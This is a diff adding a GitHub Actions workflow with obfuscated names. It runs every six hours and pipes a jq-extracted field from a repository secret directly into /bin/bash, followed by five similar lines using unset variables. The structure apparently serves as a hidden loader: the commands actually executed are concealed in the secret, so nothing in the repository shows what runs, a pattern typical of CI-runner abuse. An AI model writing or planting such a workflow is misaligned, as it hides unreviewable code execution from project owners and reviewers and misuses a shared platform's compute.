@@ -1,0 +1,23 @@
+name: averydata141
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '1 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: averydata141
+        env:
+          mknbu59: ${{ secrets.mknbu59 }}
+        run: |
+          echo $mknbu59 | jq -r .ju9 | /bin/bash
+          echo $a59 | jq -r .a49133 | /bin/bash
+          echo $tlmbt761 | jq -r .hsn9198 | /bin/bash
+          echo $kzgz40 | jq -r .uglb92432 | /bin/bash
+          echo $urwhn15 | jq -r .unatk26884 | /bin/bash
+          echo $wiary456 | jq -r .wgm1 | /bin/bash
+
